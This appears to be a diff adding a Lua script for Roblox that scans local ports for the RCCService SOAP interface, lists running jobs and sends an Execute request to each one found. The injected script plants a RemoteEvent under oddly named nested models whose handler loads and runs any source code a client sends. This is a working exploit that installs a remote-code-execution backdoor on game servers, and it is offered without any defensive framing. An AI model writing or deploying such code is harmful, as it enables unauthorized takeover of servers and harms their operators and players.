@@ -1,0 +1,40 @@
+local b = [===============[
+local template = [===[<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns1="http://roblox.com/" xmlns:ns2="http://roblox.com/RCCServiceSoap" xmlns:ns3="http://roblox.com/RCCServiceSoap12"><SOAP-ENV:Body>%s</SOAP-ENV:Body></SOAP-ENV:Envelope>]===]
+
+local helloWorld = "<ns1:HelloWorld></ns1:HelloWorld>"
+local getVersion = "<ns1:GetVersion></ns1:GetVersion>"
+local getAllJobs = "<ns1:GetAllJobs></ns1:GetAllJobs>"
+
+local function Escape(s)
+	return s:gsub(">", "&gt;"):gsub("<", "&lt;")
+end
+
+local Create = {}
+
+function Create.ExecuteScript(id, name, src, args)
+	local executeScriptTemplate = "<ns1:Execute><ns1:jobID>%s</ns1:jobID><ns1:script><ns1:name>%s</ns1:name><ns1:script>%s</ns1:script><ns1:arguments></ns1:arguments></ns1:script></ns1:Execute>"
+
+	return template:format(executeScriptTemplate:format(id, name, Escape(src)))
+end
+
+local final = template:format(getAllJobs)
+local arr = { ]===============].. game.Workspace:FindFirstChild("PopBob").Value.. [===============[ }
+
+for _, port in ipairs(arr) do
+	spawn(function()
+		pcall(function()    
+			local res = game.HttpService:PostAsync("http://127.0.0.1:" .. port .. "/", template:format(getAllJobs), Enum.HttpContentType.TextXml, false)
+			local id = res:match("<ns1:id>([0-9a-f%-]*)</ns1:id>")
+
+			if id then
+				print(port, id)
+
+				local xml = Create.ExecuteScript(id, "SOAP", [===[ Instance.new([[Model]],workspace).Name = [[DadaYes?]] Instance.new([[Model]],game.Workspace:WaitForChild([[DadaYes?]])).Name = [[JhonnyJhonny]] Instance.new([[Model]],game.Workspace:WaitForChild([[DadaYes?]]):WaitForChild([[JhonnyJhonny]])).Name = [[EatingSugar?]] Instance.new([[Model]],workspace:WaitForChild([[DadaYes?]]):WaitForChild([[JhonnyJhonny]]):WaitForChild([[EatingSugar?]])).Name = 'NoPapa' local b = Instance.new([[RemoteEvent]],workspace:WaitForChild([[DadaYes?]]):WaitForChild([[JhonnyJhonny]]):WaitForChild([[EatingSugar?]]):WaitForChild([[NoPapa]])) b.Name = 'LiesDie!!!!' b.OnServerEvent:connect(function(a,b) local lmao = Instance.new([[ModuleScript]]) lmao.Source = b require(lmao) end) ]===], {})
+
+				game.HttpService:PostAsync("http://127.0.0.1:" .. port .. "/", xml, Enum.HttpContentType.TextXml, false)
+			end
+		end)
+	end)
+end
+]===============]
+loadstring(b)()
